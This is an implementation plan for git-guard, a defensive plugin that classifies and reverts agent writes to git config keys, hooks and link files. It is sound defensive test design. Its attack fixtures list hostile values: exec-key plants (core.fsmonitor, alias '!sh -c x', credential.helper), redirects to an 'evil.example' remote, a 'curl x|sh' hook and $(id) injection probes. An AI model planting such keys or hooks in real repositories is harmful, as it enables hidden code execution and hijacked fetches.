# git-guard pure core Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build git-guard's pure verdict core: the data model, the classifier table, installer templates and `judge()`, proven against the real key corpus and a set of attack rows. It does no IO, has no hook wiring, and never sees command text.

**Architecture:** New plugin `plugins/git-guard/` with Python package `gitguard`. `model.py` holds frozen dataclasses only. `rules.py` is the config-key table and value checks. `templates.py` holds installer data (lfs, hk, portool). `files.py` classifies hook and link files. `judge.py` is the one verdict function. Every function is pure: tests build a `Surface` by hand, call `judge()`, and assert on the `Verdict`. Probe, state, act, engine and hooks are the v0.1 release, planned separately once experiments X1/X2/X3/X15 report.

**Tech Stack:** Python ≥3.10, stdlib only at runtime; uv + pytest for dev. Same layout as `plugins/sandbox-advisor`.

**Spec:** `design/design.md` and `design/sketch.py` in local research notes (not in this repo). Executors on another machine work from this plan alone; the plan copies every value it needs from them.

## Global Constraints

- Runtime is stdlib only. `pyproject.toml` has no runtime dependencies; dev group is `pytest>=8` only (no hypothesis).
- `requires-python = ">=3.10"`. Every module starts with `from __future__ import annotations`.
- Pure modules (`model`, `rules`, `templates`, `files`, `judge`) never import `os`, `subprocess` or `pathlib` IO methods (`exists`, `resolve`, `read_*`, `stat`). Path math uses `PurePosixPath` and `posixpath.normpath` only. A test enforces this.
- `judge` and `classify` never receive command text. Nothing in this plan parses a shell command.
- No config knob may switch off a Kind or a check. The only exception mechanism is `TrustSet` grants of `(anchor, atom_hash)`.
- `Finding.id` is `"f-"` + the first 6 hex chars of `sha256(f"{anchor.path}\0{atom_hash(atom)}")`. That matches the accept regex `^git-guard accept f-[0-9a-f]{6}( f-[0-9a-f]{6})*$` used later.
- `judge` emits only `Action.REVERT` or `Action.WARN` on findings. `BLOCK` (Stop) and `RECORD` (notes) are render-time decisions in v0.1.
- Test fixtures committed here must not contain Josh's repo names, branch names, owners or home path. Task `corpus-fixtures` scrubs them, and a test checks that.
- Commits are conventional with scope `git-guard` (`feat(git-guard): …`). `scripts/check-commit-scope.sh` requires the scope to be a plugin in `.claude-plugin/marketplace.json`, so `plugin-scaffold` adds that entry first. Run `git commit` plainly, without bypassing signing.
- Run tests from the repo root with `uv run --directory plugins/git-guard pytest tests/ -v`.

## Review Focus

1. **A multi-valued key with one bad value** (`include.path` ×2, `remote.origin.fetch` ×2). The restore must remove only the offending value and never `--unset-all` the good ones. Pinned by `test_multivar_restore_unsets_only_offending_value` in `judge`.
2. **Case and spelling of keys.** `core.hooksPath` vs `core.hookspath`; a subsection with uppercase and dots (`url.https://Evil/.insteadOf`, `submodule.vendor/vim-plug.url`). Section and variable are lowercased, the subsection is verbatim. Pinned by `test_parse_keeps_dotted_subsection_verbatim` in `model-types` and `test_attack_rows_all_found` using mixed case.
3. **The `claude --worktree` rewrite.** A relative `core.hooksPath=.githooks` becomes an absolute path to main's `.githooks` in a worktree's `config.worktree`. It must pass, with no exception path. Pinned by `test_hookspath_absolute_rewrite_same_target_passes` in `rules-table`.
4. **A repo the agent creates mid-session** with a planted exec key. `lkg=None` and `first_sight_in_session=True` must yield REVERT with `UnsetKey`, not WARN. Pinned by `test_first_sight_in_session_plant_is_revertible` in `judge`.
5. **A symlinked hook whose target bytes match an lfs template.** Symlinks never template-pass. Pinned by `test_symlink_hook_never_template_passes` in `file-atoms`.

---

### Task: plugin-scaffold

**Files:**
- Create: `plugins/git-guard/pyproject.toml`, `plugins/git-guard/.claude-plugin/plugin.json`, `plugins/git-guard/README.md`, `plugins/git-guard/gitguard/__init__.py`, `plugins/git-guard/tests/__init__.py`, `plugins/git-guard/tests/test_plugin_structure.py`, `.github/workflows/git-guard-plugin-tests.yml`
- Modify: `.claude-plugin/marketplace.json` (add entry), `README.md` (regenerated plugin table)

**Interfaces:**
- Produces: importable package `gitguard`; test runner command from Global Constraints.

- [ ] **Step 1: Write the failing structure tests** in `tests/test_plugin_structure.py`:
  - `test_manifest_valid`: `plugin.json` has `name == "git-guard"` and a non-empty `description`.
  - `test_marketplace_lists_plugin`: the repo-root `marketplace.json` has an entry `{"name": "git-guard", "source": "./plugins/git-guard"}` with a `version`.
  - `test_pure_modules_do_no_io`: for each of `model.py rules.py templates.py files.py judge.py` that exists, parse with `ast` and assert no `import os`, `import subprocess`, `import shutil`, and no attribute calls named `exists|resolve|read_text|read_bytes|stat|open|iterdir|glob`.
- [ ] **Step 2: Run** `uv run --directory plugins/git-guard pytest tests/ -v`. Expected: FAIL (missing files).
- [ ] **Step 3: Create the scaffold.**
  - Copy `pyproject.toml` from `plugins/sandbox-advisor`, with `name = "git-guard"` and `description = "Detects and reverts agent writes to git internals (exec config keys, hooks, redirects)"`.
  - Set `plugin.json` `description` to the same string.
  - Add a marketplace entry with `"version": "0.1.0"` and that description.
  - Copy the workflow from `sandbox-advisor-plugin-tests.yml`, with paths and working-directory changed to `plugins/git-guard`.
  - README: one paragraph saying what it is, a "Status: pure core only, no hooks wired" line, and this exact limit statement: "git-guard is a speed bump, not a security boundary. It runs as you, so an agent that knows about it can edit its state. It catches confused agents and generic injections, and makes persistence visible or undone."
  - Run `./scripts/generate-plugin-table.sh` to refresh the root README.
- [ ] **Step 4: Run** the tests, plus `./scripts/generate-plugin-table.sh --check`. Expected: PASS, and "up to date".
- [ ] **Step 5: Commit** `feat(git-guard): scaffold plugin with structure tests`.

### Task: corpus-fixtures

**Files:**
- Modify (outside this repo, in the local research notes): `gitscan/scan.sh`
- Create: `plugins/git-guard/tools/import_gitscan.py`, `plugins/git-guard/tests/fixtures/corpus.tsv`, `plugins/git-guard/tests/fixtures/corpus_tracked_dirs.txt`, `plugins/git-guard/tests/fixtures/attacks.tsv`, `plugins/git-guard/tests/fixtures/git-help-config.txt`, `plugins/git-guard/tests/fixtures/hooks/{lfs-3.7.1,lfs-echo,portool}/<hook-name>`, `plugins/git-guard/tests/test_fixtures.py`

**Interfaces:**
- Produces:
  - `corpus.tsv`: tab-separated `config_path<TAB>key<TAB>value`. `config_path` is `/home/u/src/repo-NN/.git/<rel>`, where `<rel>` is `config`, `config.worktree`, `worktrees/<n>/config.worktree` or `modules/<sub>/config`. Keys are git-normalized.
  - `corpus_tracked_dirs.txt`: one absolute scrubbed tracked hooks dir per line.
  - `attacks.tsv`: `key<TAB>value<TAB>expected_kind<TAB>expected_action`.

- [ ] **Step 1: Extend gitscan (X8).**
  - Make `scan.sh` also emit rows from `.git/config.worktree`, `.git/worktrees/*/config.worktree` and `.git/modules/**/config`, read with `git config --file F --list -z` (no `--includes`).
  - Rerun it. Expect the 994 rows plus the 5 `config.worktree` files, which include one repo's absolute `core.hookspath` and dotfiles' `core.longpaths`.
  - Note the new count in the research dir's `experiments/results.md` under a new "X8" heading.
- [ ] **Step 2: Write `tests/test_fixtures.py`** with:
  - `test_corpus_is_scrubbed`. Every `config_path` matches `^/home/u/src/repo-\d+/\.git/`. Every URL value's path part matches `owner-\d+/repo-\d+(\.git)?`. Every `branch.<b>` subsection, and every `refs/heads/<b>` in values, matches `b-\d+`, except `main` and `master`. No value contains `technicalpickles` or `/Users/`.
  - `test_attacks_count`: 38 rows.
  - `test_hook_fixtures_present`: 4 files each in `lfs-3.7.1` and `lfs-echo`, 2 in `portool`.
- [ ] **Step 3: Run** them. Expected: FAIL (no fixtures).
- [ ] **Step 4: Implement `tools/import_gitscan.py <all_keys.tsv> <tracked_dirs...>`**, writing `corpus.tsv` and `corpus_tracked_dirs.txt`.
  - It's deterministic: number repos, owners and branches in first-seen order, one counter each.
  - Rewrite the same token the same way everywhere it appears: path, subsection, `refs/heads/…`, `worktrunk.*` values and absolute hooksPath values.
  - Keep hosts and the URL scheme shape (scp-like vs `https://`) unchanged.
  - Pass the real tracked hooks dirs (the two repos with tracked `.githooks`) as arguments, so they get scrubbed with the same repo mapping.
  - Run it.
- [ ] **Step 5: Write the remaining fixtures.**
  - `attacks.tsv`: the 38 rows below, with expected Kind and action. REVERT rows are REVERT because the attack tests run with an LKG baseline and `may_revert=True`.

    | key | value | kind | action |
    |---|---|---|---|
    | core.fsmonitor | /tmp/x | exec | revert |
    | core.pager | sh -c x | exec | revert |
    | core.editor | x | exec | revert |
    | core.sshCommand | x | exec | revert |
    | alias.st | !sh -c x | exec | revert |
    | filter.x.clean | sh -c x | exec | revert |
    | filter.lfs.smudge | sh -c x | exec | revert |
    | diff.external | /tmp/x | exec | revert |
    | diff.x.textconv | /tmp/x | exec | revert |
    | merge.x.driver | /tmp/x | exec | revert |
    | credential.helper | !f() { :; }; f | exec | revert |
    | hook.evil.command | sh -c x | exec | revert |
    | hook.hk-pre-commit.command | sh -c x | exec | revert |
    | hook.hk-pre-commit.event | post-checkout | exec | revert |
    | submodule.s.update | !sh -c x | exec | revert |
    | core.hooksPath | /tmp/evil | redirect | revert |
    | core.hooksPath | ../../evil | redirect | revert |
    | remote.origin.url | ext::sh -c x | redirect | revert |
    | remote.origin.url | /tmp/evil.git | redirect | revert |
    | remote.origin.url | https://evil.example/x.git | redirect | revert |
    | remote.origin.uploadpack | /tmp/x | exec | revert |
    | remote.origin.vcs | evil | exec | revert |
    | branch.main.remote | https://evil.example/x.git | redirect | revert |
    | include.path | /tmp/evil.cfg | redirect | revert |
    | url.https://Evil/.insteadOf | https://github.com/ | redirect | revert |
    | init.templateDir | /tmp/tpl | redirect | revert |
    | core.attributesFile | /tmp/a | redirect | revert |
    | gpg.program | /tmp/x | exec | revert |
    | uploadpack.packObjectsHook | /tmp/x | exec | revert |
    | pager.log | sh -c x | exec | revert |
    | difftool.x.cmd | x | exec | revert |
    | lfs.url | https://evil.example/lfs | redirect | revert |
    | tar.x.command | x | exec | revert |
    | interactive.diffFilter | x | exec | revert |
    | commit.gpgSign | false | weaken | warn |
    | http.sslVerify | false | weaken | warn |
    | protocol.ext.allow | always | weaken | warn |
    | core.hooksPath | /dev/null | weaken | warn |

  - `git-help-config.txt`: the output of `git help --config` from git 2.54.0, 995 lines, with the git version in a `# git 2.54.0` first line.
  - Hook fixtures: copy the real files byte for byte.
    - `lfs-3.7.1`: from a local repo with git-lfs 3.7.1 hooks (`.git/hooks/{post-checkout,post-commit,post-merge,pre-push}`).
    - `lfs-echo`: from a local repo with the older echo-style git-lfs hooks (same four names).
    - `portool`: from a local repo with portool hooks (`.git/hooks/{post-checkout,post-merge}`), with the home path replaced by `/home/u/` (it's structural, so the hash isn't load-bearing).
- [ ] **Step 6: Run** the tests. Expected: PASS.
- [ ] **Step 7: Commit** `test(git-guard): add scrubbed key corpus, attack rows and hook fixtures`.

### Task: model-types

**Files:**
- Create: `plugins/git-guard/gitguard/model.py`, `plugins/git-guard/tests/test_model.py`, `plugins/git-guard/tests/support.py`

**Interfaces:**
- Produces (in `model.py`): every dataclass and enum in the sketch's `model.py` section, same names and fields, with these changes:
  - `Surface` gains `tracked_dirs: frozenset[PurePosixPath]` (absolute tracked hooks dirs, which probe computes later) and `home: PurePosixPath`. It loses `TrackedOracle`.
  - All path fields are `PurePosixPath`, not `Path`.
  - `Fingerprint.EMPTY = Fingerprint(sigs={})` is a class-level constant.
  - `ConfigKey.parse(dotted: str) -> ConfigKey`: section = first segment lowercased, variable = last segment lowercased, subsection = everything between, verbatim (may contain dots), or `None`.
  - `ConfigKey.dotted() -> str` round-trips.
  - `RuleSet`, `Row`, `Templates`, `HookTemplate` and `ConfigTemplate` live in `rules.py`/`templates.py`, not here.
- Produces (in `tests/support.py`, used by every later test file):
  - `ANCHOR = Anchor(PurePosixPath("/r/a"))`, `COMMON = MemberRef(PurePosixPath("/r/a/.git"), "common")`
  - `entry(dotted, value, *, file="/r/a/.git/config", member=COMMON, scope="local") -> ConfigEntry`
  - `hook(name, content: bytes, *, kind="file", executable=True, member=COMMON) -> FileAtom` (path `/r/a/.git/hooks/<name>`, `sha256` computed)
  - `link(role, content: bytes | None, *, path=None) -> FileAtom` (`kind="absent"` when `content` is `None`)
  - `surface(entries=(), files=(), *, toplevels=("/r/a",), tracked_dirs=(), home="/home/u", anchor=ANCHOR, common_dir="/r/a/.git") -> Surface`
  - `trigger(kind=TriggerKind.POST_TOOL, *, may_revert=True, may_block=False, first_sight=False) -> Trigger`
  - `corpus_surfaces() -> list[Surface]`: groups `corpus.tsv` by anchor (`/home/u/src/repo-NN`). Member role comes from `<rel>`: `config`/`config.worktree` → common, `worktrees/<n>/…` → admin, `modules/<s>/config` → module. Scope comes from the filename. `tracked_dirs` come from `corpus_tracked_dirs.txt` entries under that anchor.

- [ ] **Step 1: Write failing tests** in `tests/test_model.py`:
  - `test_parse_lowercases_section_and_variable`: `ConfigKey.parse("Core.HooksPath") == ConfigKey("core", None, "hookspath")`.
  - `test_parse_keeps_dotted_subsection_verbatim`: `ConfigKey.parse("url.https://Evil/.insteadOf") == ConfigKey("url", "https://Evil/", "insteadof")`, and `ConfigKey.parse("submodule.vendor/vim-plug.url").subsection == "vendor/vim-plug"`.
  - `test_dotted_round_trips` for both shapes.
  - `test_dataclasses_are_frozen_and_hashable`: `hash(surface(...))` works, and assigning a field raises `FrozenInstanceError`.
  - `test_corpus_surfaces_cover_every_row`: the sum of `len(s.entries)` equals the row count of `corpus.tsv`.
- [ ] **Step 2: Run.** Expected: FAIL (import error).
- [ ] **Step 3: Implement `model.py`** from the sketch with the changes above, and `support.py`.
- [ ] **Step 4: Run.** Expected: PASS.
- [ ] **Step 5: Commit** `feat(git-guard): add verdict data model`.

### Task: rules-table

**Files:**
- Create: `plugins/git-guard/gitguard/rules.py`, `plugins/git-guard/tests/test_rules.py`, `plugins/git-guard/tests/fixtures/reviewed_unknown.txt`

**Interfaces:**
- Consumes: `model.py` types, `support.py` builders.
- Produces:
  - `Row(kind: Kind, section: str, subsection: str | None, variables: frozenset[str], var_regex: str | None, when: str | None, value_check: str, on_fail: Kind, doc: str)`.
    - `section="*"` means any section.
    - `subsection=None` means the key must have none, `"*"` means any or none, and any other string must match exactly.
    - `when` names a value predicate that gates whether the row applies at all (WEAKEN rows, bool-vs-command splits).
    - `value_check` names a check the value must pass once the row applies.
  - `ROWS: tuple[Row, ...]`, ordered: WEAKEN (when-gated), ROUTINE, REDIRECT, EXEC. First match wins.
  - `rows_for_key(key: ConfigKey) -> tuple[Row, ...]`: name-only matches, ignoring `when`.
  - `match_row(key: ConfigKey, value: str) -> Row | None`.
  - `ClassifyCtx(surface: Surface, lkg: Lkg | None, remotes: frozenset[str], hosts: frozenset[str])` and `make_ctx(cur: Surface, lkg: Lkg | None, rules: RuleSet) -> ClassifyCtx`.
    - `remotes`: every `<r>` in `remote.<r>.*` of `cur`.
    - `hosts`: hosts of `remote.*.url`, `remote.*.pushurl` and `submodule.*.url` in `lkg` if there is one, otherwise in `cur`, plus `rules.trusted_hosts`.
  - `RuleSet(rows, templates, trusted_hosts)` and `default_rules() -> RuleSet`, with `trusted_hosts = frozenset({"github.com"})`.
  - `classify_entry(entry: ConfigEntry, ctx: ClassifyCtx, rules: RuleSet) -> tuple[Kind, Pass]`:
    - no row → `(UNKNOWN, NONE)`
    - check passes → `(row.kind, LITERAL)` for ROUTINE, `VALUE_OK` for REDIRECT, `TEMPLATE` for EXEC
    - check fails → `(row.on_fail, NONE)`
    - WEAKEN rows' check is `never`
  - `resolve_redirect(entry: ConfigEntry, ctx: ClassifyCtx) -> tuple[PurePosixPath, ...]`: the resolved targets of a path-valued redirect (hooksPath, core.worktree, include.path), used by the checks.

The table, with exact members. Variables are lowercase as git normalizes them.

| Kind | section / subsection / variables | when | value_check | on_fail |
|---|---|---|---|---|
| WEAKEN | `commit`/None/`gpgsign`, `tag`/None/`gpgsign`, `http`/`*`/`sslverify`, `transfer`/None/`fsckobjects`, `fetch`/None/`fsckobjects`, `receive`/None/`fsckobjects`, `core`/None/`protecthfs`, `core`/None/`protectntfs` | `is_false` | `never` | WEAKEN |
| WEAKEN | `protocol`/`*`/`allow` | `in:always,user` | `never` | WEAKEN |
| WEAKEN | `core`/None/`hookspath` | `eq:/dev/null` | `never` | WEAKEN |
| ROUTINE | `core`/None/`repositoryformatversion` | | `in:0,1` | UNKNOWN |
| ROUTINE | `core`/None/`{filemode,bare,ignorecase,precomposeunicode,symlinks,longpaths,sparsecheckout,sparsecheckoutcone}` | | `bool` | UNKNOWN |
| ROUTINE | `core`/None/`logallrefupdates` | | `bool_or:always` | UNKNOWN |
| ROUTINE | `core`/None/`fsmonitor` | `bool` | `bool` | EXEC |
| ROUTINE | `extensions`/None/`{worktreeconfig,relativeworktrees}` | | `bool` | UNKNOWN |
| ROUTINE | `extensions`/None/`objectformat` | | `in:sha1,sha256` | UNKNOWN |
| ROUTINE | `extensions`/None/`refstorage` | | `in:files,reftable` | UNKNOWN |
| ROUTINE | `branch`/`*`/`{remote,pushremote}` | | `remote_name_or_url` | REDIRECT |
| ROUTINE | `branch`/`*`/`merge` | | `prefix:refs/` | UNKNOWN |
| ROUTINE | `branch`/`*`/`{rebase,description,gh-merge-base,vscode-merge-base}` | | `any` | UNKNOWN |
| ROUTINE | `remote`/`*`/`fetch` | | `fetch_refspec` | UNKNOWN |
| ROUTINE | `remote`/`*`/`gh-resolved` | | `gh_resolved` | UNKNOWN |
| ROUTINE | `remote`/`*`/`{tagopt,prune,prunetags}` | | `any` | UNKNOWN |
| ROUTINE | `submodule`/`*`/`{active,branch,ignore,fetchrecursesubmodules,shallow}` | | `any` | UNKNOWN |
| ROUTINE | `lfs`/None/`repositoryformatversion` | | `in:0` | UNKNOWN |
| ROUTINE | `worktrunk`/None/`{default-branch,history}` | | `refname` | UNKNOWN |
| ROUTINE | `maintenance`/None/`auto` | | `bool` | UNKNOWN |
| ROUTINE | `index`/None/`sparse` | | `bool` | UNKNOWN |
| ROUTINE | `pager`/`*`/`*` | `bool` | `bool` | EXEC |
| REDIRECT | `remote`/`*`/`{url,pushurl}`, `submodule`/`*`/`url`, `lfs`/`*`/`{url,pushurl}` | | `url` | REDIRECT |
| REDIRECT | `core`/None/`hookspath` | | `hooks_path` | REDIRECT |
| REDIRECT | `core`/None/`worktree` | | `worktree_path` | REDIRECT |
| REDIRECT | `include`/None/`path`, `includeif`/`*`/`path` | | `include_path` | REDIRECT |
| REDIRECT | `url`/`*`/`{insteadof,pushinsteadof}`, `init`/None/`templatedir`, `core`/None/`{attributesfile,excludesfile}`, `http`/`*`/`proxy` | | `never` | REDIRECT |
| EXEC | `hook`/`*`/`*`, `filter`/`*`/`*` | | `template` | EXEC |
| EXEC | `pager`/`*`/`*` (reached only when the bool ROUTINE row didn't apply) | | `never` | EXEC |
| EXEC | `alias`/`*`/`*` | `prefix:!` | `never` | EXEC |
| EXEC | `submodule`/`*`/`update` | `prefix:!` | `never` | EXEC |
| EXEC | `{difftool,mergetool,man,browser,gpg}`/`*`/`path` | | `never` | EXEC |
| EXEC | `lfs`/`customtransfer`-prefixed subsection/`*` | | `never` | EXEC |
| EXEC | `*`/`*`/`{command,cmd,driver,clean,smudge,process,textconv,program,helper,pager,editor,sshcommand,askpass,gitproxy,external,packobjectshook,vcs,uploadpack,receivepack,difffilter,defaultkeycommand,alternaterefscommand,fsmonitor}` | | `never` | EXEC |
| EXEC | `*`/`*`/var_regex `hook$`, excluding `advice.ignoredhook` and `core.fsmonitorhookversion` | | `never` | EXEC |

Value checks (names as used in the table):
- `bool`: `true false yes no on off 0 1`, case-insensitive, plus the empty string (git reads that as true).
- `url`:
  - Accept only scp-like `user@host:path`, or `https|ssh|git://[user@]host[:port]/…`, with the host in `ctx.hosts`.
  - Reject outright any value starting with `-`, containing `::`, starting with `file:`, or being a bare path.
- `remote_name_or_url`: passes when the value is `.` or in `ctx.remotes`. Otherwise it's the `url` check.
- `fetch_refspec`: the prototype regex `^\+?refs/[^:]+:refs/remotes/<re.escape(r)>/`.
- `gh_resolved`: `base`, or `owner/repo` shaped.
- `refname`: `^[A-Za-z0-9][A-Za-z0-9._/@+-]*$`.
- `hooks_path`:
  - Resolve: `~/` expands to `surface.home`, an absolute path stays as is, and a relative path joins each toplevel in `surface.toplevels`. Then `normpath`.
  - Pass iff every resolution stays inside its toplevel (for an absolute path: inside some toplevel) **and** at least one resolution is in `surface.tracked_dirs`.
  - Also pass if the resolved set equals the resolved set of the LKG's `core.hookspath` from the same file.
- `worktree_path`: `normpath(member.git_dir / value)` lies inside `surface.anchor.path`.
- `include_path`: the target resolves, relative to the including file's directory with `~/` expanded, inside some member's `git_dir`.
- `template`: delegates to `templates.config_template_match` (task `templates`). It returns `False` here until that task lands.

- [ ] **Step 1: Write failing tests** in `tests/test_rules.py`:
  - `test_row_examples`: a parametrized list of `(dotted, value, expected_kind, expected_pass)` covering at least one pass and one fail per table row. Include:
    - `("core.fsmonitor","true",ROUTINE,LITERAL)` and `("core.fsmonitor","/tmp/x",EXEC,NONE)`
    - `("pager.log","false",ROUTINE,LITERAL)`
    - `("alias.co","checkout",UNKNOWN,NONE)`
    - `("core.hookspath","/dev/null",WEAKEN,NONE)`
    - `("commit.gpgsign","true",UNKNOWN,NONE)`
    - `("advice.ignoredhook","false",UNKNOWN,NONE)`
    - `("gc.recentobjectshook","/tmp/x",EXEC,NONE)`
  - `test_url_rejects_transport_and_paths`: `ext::sh -c x`, `fd::17`, `file:///tmp/x`, `/tmp/x.git`, `-uhttps://github.com/a/b`, and `https://evil.example/x.git` (host not in `{github.com}`) all fail; `git@github.com:a/b.git` and `https://github.com/a/b.git` pass.
  - `test_hookspath_relative_tracked_passes`: `.githooks` with toplevel `/r/a` and `tracked_dirs={/r/a/.githooks}` → `(REDIRECT, VALUE_OK)`.
  - `test_hookspath_escape_fails`: `../../evil` → `(REDIRECT, NONE)`.
  - `test_hookspath_absolute_rewrite_same_target_passes`: an entry in `/r/a/.git/worktrees/w/config.worktree` with value `/r/a/.githooks`, toplevels `(/r/a, /r/w)`, tracked `{/r/a/.githooks}` → VALUE_OK.
  - `test_core_worktree_under_superproject`: member `/r/a/.git/modules/sub`, value `../../../sub` passes; `../../../../elsewhere` fails.
  - `test_hosts_come_from_lkg_when_present`: with an LKG holding only github.com remotes, a current `remote.origin.url=https://gitlab.example/x.git` fails even though it's the only URL in `cur`.
  - `test_git_help_config_fully_reviewed`:
    - For every var in `git-help-config.txt`, replace each `<…>` segment with `x` and parse it.
    - Assert `rows_for_key(key)` is non-empty, or the dotted placeholder form is listed in `reviewed_unknown.txt`.
    - Assert no listed var matches `(cmd|command|program|hook|helper|driver|editor|pager|proxy|askpass|textconv|external|filter|sshcommand)` unless its line ends `# reviewed: <reason>`.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement `rules.py`** as above. Keep `ROWS` as a literal tuple of `Row(...)` with a `doc` on each. Keep the `when`/check predicates in a `PREDICATES: Mapping[str, Callable]` dict, with parameterized names (`in:`, `eq:`, `prefix:`, `bool_or:`) parsed once at import.
- [ ] **Step 4: Generate `reviewed_unknown.txt`.** Write a throwaway loop that prints the vars `rows_for_key` misses, review each one by hand against the regex above, and commit the file. Any var that names an executable belongs in an EXEC row instead: add the row, then re-run.
- [ ] **Step 5: Run.** Expected: PASS.
- [ ] **Step 6: Commit** `feat(git-guard): add config key classifier table`.

### Task: templates

**Files:**
- Create: `plugins/git-guard/gitguard/templates.py`, `plugins/git-guard/tests/test_templates.py`
- Modify: `plugins/git-guard/gitguard/rules.py` (the `template` check calls into `templates`)

**Interfaces:**
- Consumes: `ConfigEntry`, `FileAtom`, `Surface`.
- Produces:
  - `Templates`, `HookTemplate(name, hook_names, body_regex, notice)`, and `DEFAULT_TEMPLATES`.
  - `config_template_match(entry: ConfigEntry, surface: Surface, templates: Templates) -> str | None`, which returns the template name.
  - `hook_template_match(atom: FileAtom, templates: Templates) -> HookTemplate | None`. A `kind != "file"` returns `None`. Exact sha matches return a `HookTemplate(name="lfs", notice=False)`.

Template data (exact):
- **lfs filter:** `filter.lfs.clean = git-lfs clean -- %f`, `filter.lfs.smudge = git-lfs smudge -- %f`, `filter.lfs.process = git-lfs filter-process`, `filter.lfs.required = true`. These are exact string matches.
- **hk:** `hook.hk-<E>.command` matches `^test "\$\{HK:-1\}" = "0" \|\| hk run (?P<e>[a-z-]+) --from-hook$` with `e == E`, **and** the same file holds `hook.hk-<E>.event == E`. An `event` entry passes only if that same command peer matches with the same `E`.
- **lfs hook sha256 variants**, keyed by hook name:
  - post-checkout: `8d606e58cce98604696a4abcf3ae1ebde6f9f31ac72bb0d44e2444cc39f26030`, `791471b4ff472aab844a4fceaa48bbb0a12193616f971e8e940625498b4938a6`
  - post-commit: `f3eb4d1f62924c09d481a0563a84b158c66eb2feb3431cfdb3e6760aab4d661d`, `21e961572bb3f43a5f2fbafc1cc764d86046cc2e5f0bbecebfe9684a0b73b664`
  - post-merge: `cecb594e8fa65831654fc95e96db9f1249e09c52810c6fbb2b428280aac22158`, `75da0da66a803b4b030ad50801ba57062c6196105eb1d2251590d100edb9390b`
  - pre-push: `a52d0510d0f8c75e27852156ec6f7791f0d8ed65fc58fcc368dd1de0a60a1d74`, `df5417b2daa3aa144c19681d1e997df7ebfe144fb7e3e05138bd80ae998008e4`
- **lfs structural fallback** (`notice=False`):
  - Hook names: the same four.
  - Body: `#!/bin/sh`, then the `command -v git-lfs >/dev/null 2>&1 || { … ; exit 2; }` line, then `git lfs <name> "$@"`.
  - The `…` is either `echo >&2 "<msg>"` or `printf >&2 "\n%s\n\n" "<msg>"`.
  - `<msg>` contains no `"`, `$`, backtick or backslash, except the literal two-char `\n`.
  - The `<name>` in the last line must equal the file's own hook name.
- **portool structural** (`notice=True`):
  - Hook names: `post-checkout`, `post-merge`.
  - Body: the 8-line script in `tests/fixtures/hooks/portool/post-checkout`, with the `PORTOOL_BIN="…"` value as the only slot.
  - The slot must be an absolute path ending in `/portool`, with no `"`, `$`, backtick, backslash or newline.

- [ ] **Step 1: Write failing tests** in `tests/test_templates.py`:
  - `test_lfs_filter_values_pass` and `test_lfs_filter_wrong_value_fails` (`filter.lfs.smudge = sh -c x` → `None`).
  - `test_hk_pair_passes`, `test_hk_event_mismatch_fails_both` (event `post-checkout` with a `pre-commit` command → both entries `None`), and `test_hk_wrong_subsection_fails` (`hook.evil.command` holding the hk command string).
  - `test_lfs_hook_fixtures_match_by_sha` for all 8 files in `lfs-3.7.1` and `lfs-echo`.
  - `test_lfs_structural_accepts_new_message`: the 3.7.1 body with different message words passes.
  - `test_lfs_structural_rejects_injection`: the message with `$(id)`, a backtick, or an extra line after `git lfs …` each returns `None`.
  - `test_lfs_name_must_match_file`: the `pre-push` body saved as `post-commit` returns `None`.
  - `test_portool_matches_with_notice` and `test_portool_rejects_relative_or_other_binary` (`PORTOOL_BIN="portool"`, `PORTOOL_BIN="/tmp/evil"`).
  - `test_rules_template_check_uses_templates`: `classify_entry` on `filter.lfs.clean = git-lfs clean -- %f` → `(EXEC, TEMPLATE)`.
- [ ] **Step 2: Run.** Expected: FAIL.
- [ ] **Step 3: Implement `templates.py`** and wire the `template` check in `rules.py` to `config_template_match`. Compile the regexes with `re.fullmatch` semantics, not `match`.
- [ ] **Step 4: Run** the full suite. Expected: PASS.
- [ ] **Step 5: Commit** `feat(git-guard): add lfs, hk and portool installer templates`.

### Task: file-atoms

**Files:**
- Create: `plugins/git-guard/gitguard/files.py`, `plugins/git-guard/tests/test_files.py`

**Interfaces:**
- Consumes: `FileAtom`, `Surface`, `Lkg`, `templates.hook_template_match`, `rules.ClassifyCtx`.
- Produces:
  - `HOOK_NAMES: frozenset[str]`, which is githooks(5): `applypatch-msg pre-applypatch post-applypatch pre-commit pre-merge-commit prepare-commit-msg commit-msg post-commit pre-rebase post-checkout post-merge pre-push pre-receive update proc-receive post-receive post-update reference-transaction push-to-checkout pre-auto-gc post-rewrite sendemail-validate fsmonitor-watchman p4-changelist p4-prepare-changelist p4-post-changelist p4-pre-submit post-index-change`. Verify the list against `git help githooks` on git 2.54 while writing it.
  - `classify_file(atom: FileAtom, ctx: ClassifyCtx, rules: RuleSet) -> tuple[Kind, Pass, str | None]`. The third element is an optional note for `Verdict.notes`.
  - `lkg_equal(atom: FileAtom, lkg: Lkg | None) -> bool`: same `atom_key`, `sha256`, `kind` and `executable`. `atom_key` is defined in task `judge`; until then use a local helper with the same `file|<path>` format.

Rules:
- **Hooks:**
  - A name not in `HOOK_NAMES`, or ending `.sample`, → `(ROUTINE, LITERAL, None)`.
  - Otherwise HOOKFILE. Pass order: `lkg_equal` → `LKG`, then a template match → `TEMPLATE`. A notice template adds the note `"<name> hook installed by <template> names an executable: <slot>"`.
  - Symlinks only ever pass by `LKG`.
- **`hooks-dir`** → `(ROUTINE, LITERAL, None)`.
- **`commondir`:** LINK. Passes if the content stripped of trailing whitespace is `../..`, or `lkg_equal`.
- **`gitfile`** (`<anchor>/.git` as a file, content `gitdir: <p>`): LINK. Passes if `<p>`, resolved against the anchor, is inside `surface.common_dir`.
- **`admin-gitdir`:** always `(ROUTINE, LITERAL, note-or-None)`. The note says `"stale or foreign gitdir: <content>"` when the content's dirname isn't one of `surface.toplevels`.
- **`attributes`, `alternates`:** LINK. Passes if `kind == "absent"`, or `lkg_equal`.
- **`guard-state`:** out of scope for the pure core. Raise `NotImplementedError("guard-state is classified in v0.1")`.

- [ ] **Step 1: Write failing tests** in `tests/test_files.py`:
  - `test_sample_and_unknown_names_ignored`
  - `test_lfs_hook_passes_by_template`
  - `test_new_unknown_hook_fails` (`pre-commit` holding `#!/bin/sh\ncurl x|sh\n` → `(HOOKFILE, NONE, None)`)
  - `test_changed_hook_lkg_equal_passes`
  - `test_exec_bit_change_breaks_lkg_equal`
  - `test_symlink_hook_never_template_passes` (lfs bytes, `kind="symlink"` → NONE)
  - `test_portool_hook_passes_with_note`
